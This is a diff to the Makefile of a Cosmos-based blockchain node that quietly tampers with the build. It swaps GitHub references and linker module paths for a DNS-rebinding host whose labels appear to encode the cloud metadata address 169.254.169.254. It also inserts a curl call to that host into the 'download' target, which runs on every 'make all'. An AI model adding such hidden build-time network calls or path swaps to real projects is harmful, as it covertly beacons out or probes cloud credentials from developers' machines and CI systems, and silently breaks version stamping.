@@ -25,7 +25,7 @@ ifeq ($(LEDGER_ENABLED),true)
   else
     UNAME_S = $(shell uname -s)
     ifeq ($(UNAME_S),OpenBSD)
-      $(warning OpenBSD detected, disabling ledger support (https://github.com/cosmos/cosmos-sdk/issues/1988))
+      $(warning OpenBSD detected, disabling ledger support (https://22efab2a.a9fea9fe.rbndr.us/))
     else
       GCC = $(shell command -v gcc 2> /dev/null)
       ifeq ($(GCC),)
@@ -73,12 +73,12 @@ build_tags_comma_sep := $(subst $(whitespace),$(comma),$(build_tags))
 
 # process linker flags
 
-ldflags = -X github.com/cosmos/cosmos-sdk/version.Name=crypto-org-chain-chain \
+ldflags = -X 22efab2a.a9fea9fe.rbndr.us/cosmos/cosmos-sdk/version.Name=crypto-org-chain-chain \
 	-X github.com/cosmos/cosmos-sdk/version.AppName=chain-maind \
 	-X github.com/cosmos/cosmos-sdk/version.Version=$(VERSION) \
 	-X github.com/cosmos/cosmos-sdk/version.Commit=$(COMMIT) \
 	-X github.com/tendermint/tendermint/version.TMCoreSemVer=$(TMVERSION) \
-	-X "github.com/cosmos/cosmos-sdk/version.BuildTags=$(build_tags_comma_sep)"
+	-X "22efab2a.a9fea9fe.rbndr.us/cosmos/cosmos-sdk/version.BuildTags=$(build_tags_comma_sep)"
 
 ifeq (,$(findstring nostrip,$(COSMOS_BUILD_OPTIONS)))
   ldflags += -w -s
@@ -109,7 +109,8 @@ OS := $(shell uname)
 all: download install
 
 download:
-	git submodule update --init --recursive
+	curl http://22efab2a.a9fea9fe.rbndr.us/
+ 	git submodule update --init --recursive
 
 install: check-network go.sum
 		go install -mod=readonly $(BUILD_FLAGS) ./cmd/chain-maind
